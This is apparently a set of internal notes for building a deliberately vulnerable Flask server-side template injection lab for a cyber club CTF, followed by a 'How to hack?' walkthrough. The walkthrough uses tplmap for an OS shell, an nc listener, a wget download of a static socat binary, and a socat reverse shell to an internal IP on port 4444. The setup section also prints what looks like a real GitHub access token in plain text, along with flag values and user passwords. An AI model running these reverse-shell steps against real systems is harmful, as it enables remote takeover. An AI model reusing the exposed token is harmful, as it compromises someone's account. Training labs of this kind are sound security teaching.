Server Side Template Injection RCE Vulnerability.

How to?

```sudo su```

download docker

```git clone git@github.lab.morganstanley.com:mahada/VulImages.git```

Username: Your git username

Password: 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

```cd Vulimages```

```cd flask```

```cd ssti```

```docker-compose up -d```

```docker ps```

copy container id

```docker exec -it <container id> /bin/bash```
  
  
```useradd -c 'Admin User' -d /home/security -m -s /bin/bash security```
```passwd security (Set password)``` - password is security

  create flag in security user: /home/security
  
  ```echo "cyberclubflag:{Wd0kOF3OUMqePq3PKTxUI8JnLqUc3AuX}" > cyberclubflag.txt
  echo "cyberclubflag:{Congratulations_You_got_a_2nd_Flag}" > cyberclubflag.txt```

  
Disable below commands for user 'security:
  
Cat/more/tail/less/head/vim/git/wget/locate/find/apt/scp/pip/nl/ip/hostname/rmdir/nmcli/dpkg
  
```which mkdir```
```/bin/mkdir```
```/bin/setfacl -m u:john:--- /bin/mkdir```




Download socat for them:(Socat is used to take reverse shell).
```wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat; chmod +x socat```

```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.16.134.232:4444```

set only read permissio to everyone:
```chmod a=r cyberclubflag.txt```

set permission to only owner
```chmod -R 7000 folder_name```

```apt install nmap```

Create second user champion: password is : 
Create second flag:
```echo "cyberclubflag:{Congratulations_You_got_a_2nd_Flag}" > cyberclubflag.txt```
  
  
  
  
How to hack?

Automated tools tplmap.py

```
git clone https://github.com/epinna/tplmap.git
cd tplmap
$./tplmap.py --os-shell -u 'http://172.16.137.98:8000/?name=mahadev'
```
Open second command prompt and use nc to listen to the revserse shell connection.

```
nc -lvp 4444

```
for morgan stanley ubuntu instance if you face DNS resolution error while executing nc -lvp commnad then change nameserver as follows.

```
nano /etc/resolv.conf
nameserver 8.8.8.8
```

Now execute the below command to initiate the reverse shell using socat tool.(socat tool is present app directory).
```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.16.159.93:4444

```
```  
 
  
  
